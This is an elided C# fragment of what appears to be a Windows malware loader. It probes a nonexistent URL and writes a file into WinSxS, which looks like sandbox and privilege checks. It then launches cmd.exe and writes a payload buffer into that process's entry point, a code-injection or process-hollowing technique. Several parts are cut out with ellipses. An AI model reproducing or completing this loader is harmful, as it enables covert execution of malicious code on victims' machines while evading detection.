    ...
    public class Boyle
    {
        public static void Main(string[] args)
        {
            try
            {
                ...
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://thisisanunjoinableurlol.com/");
            ...
            string file_path = "C:\\Windows\\WinSxS\\tmp.txt";
            string buff = "1234";
            ...
            string exename = "CxpCurrenciades";
            ...
            bool cResult = cp(null, "c:\\windows\\system32\\cmd.exe", IntPtr.Zero, IntPtr.Zero,
            ...
            result = wpm(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
